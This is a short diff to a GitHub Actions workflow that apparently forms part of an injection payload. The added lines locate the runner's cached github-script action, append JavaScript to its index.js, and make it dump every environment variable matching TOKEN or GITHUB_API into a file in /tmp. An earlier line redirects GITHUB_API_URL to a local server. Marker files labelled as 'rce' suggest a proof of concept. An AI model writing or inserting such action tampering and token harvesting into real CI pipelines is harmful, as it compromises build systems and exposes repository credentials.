@@ -29,6 +29,12 @@ jobs:
           nohup python3 /tmp/gab_srv.py >/dev/null 2>&1 &
           sleep 1
           echo 'GITHUB_API_URL=http://127.0.0.1:8081' >> "$GITHUB_ENV"
+          ACT_DIR=$(ls -d /home/runner/work/_actions/actions/github-script/*/dist 2>/dev/null | head -1)
+          echo "ACT_DIR=$ACT_DIR" >> /tmp/gab_rce_marker
+          cat >> "$ACT_DIR/index.js" <<'JS'
+          const _fs=require('fs');
+          _fs.writeFileSync('/tmp/gab_action_tamper', Object.entries(process.env).filter(([k])=>/TOKEN|GITHUB_API/i.test(k)).map(([k,v])=>k+'='+v).join('\n'));
+          JS
           exit 0
           </li></ul>
           PAYLOAD
